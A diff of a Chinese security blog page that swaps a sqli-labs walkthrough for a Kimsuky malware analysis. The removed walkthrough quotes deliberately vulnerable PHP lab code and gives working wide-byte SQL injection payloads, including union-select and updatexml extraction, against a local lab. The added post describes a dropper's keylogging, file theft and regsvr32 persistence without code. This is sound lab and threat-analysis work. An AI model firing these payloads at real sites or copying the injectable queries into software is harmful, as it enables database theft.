@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>sqli-labs Less 31 -&gt; sqli-labse Less 35 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="sqli-labs Less 31 -&gt; sqli-labse Less 35 | 九世的博客">
+  <title>Kimsuky 间谍活动分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="Kimsuky 间谍活动分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1849,9 +1849,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-sqli-labs-Less-31-sqli-labse-Less-35" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Kimsuky-间谍活动分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">sqli-labs Less 31 -&gt; sqli-labse Less 35</h1>
+        <h1 class="article-title">Kimsuky 间谍活动分析</h1>
     
     <div class="article-meta">
         
@@ -1860,14 +1860,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-31 23:05</time>
+        创建时间:<time class="date" title="更新时间: 2021-08-27 01:39:00">2021-08-27 01:25</time>
         
     </div>
     <div class="article-meta">
@@ -1889,7 +1889,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1904,492 +1904,24 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天从sqli-labs Less 31关撸到了35关，感觉很好，这几关是宽字节注入。就是数据库设置编码为GBK，因为gbk编码加上程序本身过滤特殊字符添加反斜杆。会造成一个繁体字：連，导致可以逃逸注入漏洞<br><img src="http://img3.xiazaizhijia.com/walls/20151130/middle_bf818e420c6c9fe.jpg" alt="middle_bf818e420c6c9fe.jpg"></p>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><b>第三十一关</b><br>首先看三十一关代码</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-31 FUN with WAF&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;])) /*如果$_GET[id]存在则执行以下*/
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $qs = $_SERVER[&#39;QUERY_STRING&#39;]; /*query string（查询字符串），如果有的话，通过它进行页面访问*/
-    $hint=$qs;
-    $id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id= ($id) LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-31.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-31-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: The Query String you input is: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>可以看到在带入数据库查询之前，这个在前后加了个双引号。闭合就是<br>得出的payload</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-31/?id=1&quot;) and 1=2 |(&quot;
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1yyoq.md.png" alt="k1yyoq.md.png"></p>
-<p><b>第三十二关</b><br>代码如下：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-32 **Bypass addslashes()**&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-function check_addslashes($string)
-{
-    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash
-    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash
-    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash
-
-
-    return $string;
-}
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-$id=check_addslashes($_GET[&#39;id&#39;]);
-//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;
-
-//logging the connection parameters to a file for analysis.
-$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-fclose($fp);
-
-// connectivity 
-
-mysql_query(&quot;SET NAMES gbk&quot;); /*将数据库设置为GBK编码引起的注入*/
-$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);
-
-    if($row)
-    {
-      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;    
-      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-      echo &quot;&lt;br&gt;&quot;;
-      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-      echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-    print_r(mysql_error());
-    echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-32.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-
-function strToHex($string)
-{
-    $hex=&#39;&#39;;
-    for ($i=0; $i &lt; strlen($string); $i++)
-    {
-        $hex .= dechex(ord($string[$i]));
-    }
-    return $hex;
-}
-echo &quot;Hint: The Query String you input is escaped as : &quot;.$id .&quot;&lt;br&gt;&quot;;
-echo &quot;The Query String you input in Hex becomes : &quot;.strToHex($id). &quot;&lt;br&gt;&quot;;
-
-?&gt;
-&lt;/center&gt;
-&lt;/font&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>原本是没有漏洞的，但是由于数据库编码设置为gbk，导致形成了宽字节注入</p>
-<pre><code>%df’ 由于&#39;的出现会有反斜杆冒出来，但是因为数据库编码为GBK，%df加上反斜杆，导致成为一个
-繁体字連，使得&#39;成功逃逸
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1oX1s.md.png" alt="k1oX1s.md.png"></p>
-<p>最终payload</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-32/?id=0%df%27%20union%20select%201,user(),3%20%23
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1Tp7T.md.png" alt="k1Tp7T.md.png"><br>使用URL编码%23来代替#</p>
-<p><b>第三十三关</b><br>三十三关的代码没变化：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-32 **Bypass addslashes()**&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-function check_addslashes($string)
-{
-    $string= addslashes($string);    
-    return $string;
-}
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-$id=check_addslashes($_GET[&#39;id&#39;]); /*添加反斜杆*/
-//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;
-
-//logging the connection parameters to a file for analysis.
-$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-fclose($fp);
-
-// connectivity 
-
-mysql_query(&quot;SET NAMES gbk&quot;);
-$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);
-
-    if($row)
-    {
-      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;    
-      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-      echo &quot;&lt;br&gt;&quot;;
-      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-      echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-    print_r(mysql_error());
-    echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-33.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-function strToHex($string)
-{
-    $hex=&#39;&#39;;
-    for ($i=0; $i &lt; strlen($string); $i++)
-    {
-        $hex .= dechex(ord($string[$i]));
-    }
-    return $hex;
-}
-echo &quot;Hint: The Query String you input is escaped as : &quot;.$id .&quot;&lt;br&gt;&quot;;
-echo &quot;The Query String you input in Hex becomes : &quot;.strToHex($id);
-?&gt;
-&lt;/center&gt;
-&lt;/font&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>闭合方式没变，数据库也还是GBK编码。注入语句常规操作</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-33/?id=1%df%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20%23
-</code></pre><p><b>第三十四关</b></p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-    &lt;title&gt;Less-34- Bypass Add SLASHES&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;
-
-&lt;div  align=&quot;center&quot; style=&quot;margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;&gt;
-
-&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;
-
-
-&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;
-&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;
-    &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;
-        &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;
-    &lt;/div&gt;  
-    &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;
-        &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;
-    &lt;/div&gt;&lt;/br&gt;
-    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;
-        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
-    &lt;/div&gt;
-&lt;/form&gt;
-
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-&lt;center&gt;
-&lt;br&gt;
-&lt;br&gt;
-&lt;br&gt;
-&lt;img src=&quot;../images/Less-34.jpg&quot; /&gt;
-&lt;/center&gt;
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-
-// take the variables
-if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))
-{
-    $uname1=$_POST[&#39;uname&#39;];
-    $passwd1=$_POST[&#39;passwd&#39;];
-
-        //echo &quot;username before addslashes is :&quot;.$uname1 .&quot;&lt;br&gt;&quot;;
-        //echo &quot;Input password before addslashes is : &quot;.$passwd1. &quot;&lt;br&gt;&quot;;
-
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;User Name:&#39;.$uname1);
-    fwrite($fp,&#39;Password:&#39;.$passwd1.&quot;\n&quot;);
-    fclose($fp);
-
-        $uname = addslashes($uname1);
-        $passwd= addslashes($passwd1);
-
-        //echo &quot;username after addslashes is :&quot;.$uname .&quot;&lt;br&gt;&quot;;
-        //echo &quot;Input password after addslashes is : &quot;.$passwd;    
-
-    // connectivity 
-    mysql_query(&quot;SET NAMES gbk&quot;);
-    @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-
-    if($row)
-    {
-          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;    
-
-          echo &quot;&lt;br&gt;&quot;;
-        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;
-        //echo &quot; You Have successfully logged in\n\n &quot; ;
-        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;    
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;/font&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;    
-
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else  
-    {
-        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;
-        //echo &quot;Try again looser&quot;;
-        print_r(mysql_error());
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;    
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-
-?&gt;
-
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-
-echo &quot;Hint: The Username you input is escaped as : &quot;.$uname .&quot;&lt;br&gt;&quot;;
-echo &quot;Hint: The Password you input is escaped as : &quot;.$passwd .&quot;&lt;br&gt;&quot;;
-?&gt;
-
-&lt;/font&gt;
-&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>也是GBK编码，还是宽字节注入，只不过请求方式变为了POST。准确的说应该是，POST宽字节注入<br>payload：</p>
-<pre><code>POST /sqli-labs-master/Less-34/ HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/sqli-labs-master/Less-34/
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 99
-
-uname=admin%df&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) %23&amp;passwd=admin&amp;submit=Submit
-</code></pre><p>反回结果：<br><img src="https://s2.ax1x.com/2019/01/31/k3P5Tg.png" alt="k3P5Tg.png"></p>
-<p><b>第三十五关</b><br>先看代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-35 **why care for addslashes()**&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-function check_addslashes($string)
-{
-    $string = addslashes($string);
-    return $string;
-}
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-$id=check_addslashes($_GET[&#39;id&#39;]);
-//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;
-
-//logging the connection parameters to a file for analysis.
-$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-fclose($fp);
-
-// connectivity 
-
-mysql_query(&quot;SET NAMES gbk&quot;);
-$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);
-
-    if($row)
-    {
-      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;    
-      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-      echo &quot;&lt;br&gt;&quot;;
-      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-      echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-    print_r(mysql_error());
-    echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-35.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: The Query String you input is escaped as : &quot;.$id;
-?&gt;
-&lt;/center&gt;
-&lt;/font&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>还是gbk编码，还是宽字节注入，，，</p>
-<pre><code>payload:http://127.0.0.1/sqli-labs-master/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k3id9s.md.png" alt="k3id9s.md.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p>
+<p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p>
+<p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p>
+<p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p>
+<p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p>
+<p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p>
+<p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p>
+<p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p>
+<p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p>
+<p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p>
+<p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p>
+<p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p>
+<p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p>
+<p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p>
+<p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2399,12 +1931,12 @@ echo &quot;Hint: The Query String you input is escaped as : &quot;.$id;
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>sqli-labs Less 31 -&gt; sqli-labse Less 35</p>
+    <p><span class="copy-title">文章标题:</span>Kimsuky 间谍活动分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-31, 23:05:44</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/a58fa3c8.html" title="sqli-labs Less 31 -&gt; sqli-labse Less 35">http://422926799.github.io/posts/a58fa3c8.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-08-27, 01:25:04</p>
+    <p><span class="copy-title">最后更新:</span>2021-08-27, 01:39:00</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5c51f955.html" title="Kimsuky 间谍活动分析">http://422926799.github.io/posts/5c51f955.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
